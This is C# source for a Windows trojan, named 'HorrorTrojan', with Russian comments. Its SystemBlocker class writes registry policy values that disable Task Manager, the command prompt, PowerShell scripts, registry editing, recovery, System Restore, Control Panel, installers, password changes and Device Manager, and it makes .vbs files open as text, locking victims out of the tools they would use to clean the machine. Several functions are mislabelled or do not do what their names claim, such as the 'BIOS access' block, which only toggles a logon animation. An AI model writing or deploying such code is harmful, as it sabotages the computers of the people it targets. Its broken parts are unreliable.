using Microsoft.Win32;

namespace HorrorTrojan
{
    internal static class SystemBlocker
    {
        public static void BlockEverything()
        {
            // ===== ОСНОВНЫЕ БЛОКИРОВКИ =====
            DisableTaskManager();
            DisableCMD();
            DisablePowerShell();
            DisableVBS();
            DisableRegistryTools();
            DisableRecovery();
            DisableSafeMode();
            DisableAlternateBoot();
            RemoveSystemRestore();
            
            // ===== ДОПОЛНИТЕЛЬНЫЕ БЛОКИРОВКИ =====
            DisableControlPanel();
            DisableInstallers();
            DisablePasswordChange();
            DisableDeviceManager();
            DisableMMC();
            DisableBIOSAccess();
        }
        
        private static void DisableTaskManager()
        {
            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
                key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                
            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
                key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
        }
        
        private static void DisableCMD()
        {
            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\System"))
                key.SetValue("DisableCMD", 2, RegistryValueKind.DWord);
                
            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"Software\Policies\Microsoft\Windows\System"))
                key.SetValue("DisableCMD", 2, RegistryValueKind.DWord);
        }
        
        private static void DisablePowerShell()
        {
            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\PowerShell"))
                key.SetValue("EnableScripts", 0, RegistryValueKind.DWord);
                
            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"Software\Policies\Microsoft\Windows\PowerShell"))
                key.SetValue("EnableScripts", 0, RegistryValueKind.DWord);
        }
        
        private static void DisableVBS()
        {
            using (RegistryKey key = Registry.ClassesRoot.CreateSubKey(@".vbs"))
                key.SetValue("", "txtfile", RegistryValueKind.String);
                
            using (RegistryKey key = Registry.ClassesRoot.CreateSubKey(@".vbe"))
                key.SetValue("", "txtfile", RegistryValueKind.String);
        }
        
        private static void DisableRegistryTools()
        {
            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
                key.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
                
            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
                key.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
        }
        
        private static void DisableRecovery()
        {
            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
                key.SetValue("DisableRecovery", 1, RegistryValueKind.DWord);
                
            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\Recovery"))
                key.SetValue("DisableRecovery", 1, RegistryValueKind.DWord);
        }
        
        private static void DisableSafeMode()
        {
            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\SafeBoot"))
                key.SetValue("OptionValue", 1, RegistryValueKind.DWord);
        }
        
        private static void DisableAlternateBoot()
        {
            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\BootManagement"))
                key.SetValue("BootManagerEnabled", 0, RegistryValueKind.DWord);
        }
        
        private static void RemoveSystemRestore()
        {
            try
            {
                using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\SystemRestore"))
                {
                    key.SetValue("DisableConfig", 1, RegistryValueKind.DWord);
                    key.SetValue("DisableSR", 1, RegistryValueKind.DWord);
                }
            }
            catch { }
        }
        
        private static void DisableControlPanel()
        {
            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"))
                key.SetValue("NoControlPanel", 1, RegistryValueKind.DWord);
        }
        
        private static void DisableInstallers()
        {
            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\Installer"))
                key.SetValue("DisableMSI", 2, RegistryValueKind.DWord);
        }
        
        private static void DisablePasswordChange()
        {
            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
                key.SetValue("DisableChangePassword", 1, RegistryValueKind.DWord);
        }
        
        private static void DisableDeviceManager()
        {
            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
                key.SetValue("NoDevMgr", 1, RegistryValueKind.DWord);
        }
        
        private static void DisableMMC()
        {
            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\MMC"))
                key.SetValue("RestrictToPermittedSnapins", 1, RegistryValueKind.DWord);
        }
        
        private static void DisableBIOSAccess()
        {
            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\System"))
                key.SetValue("EnableFirstLogonAnimation", 0, RegistryValueKind.DWord);
        }
    }
}
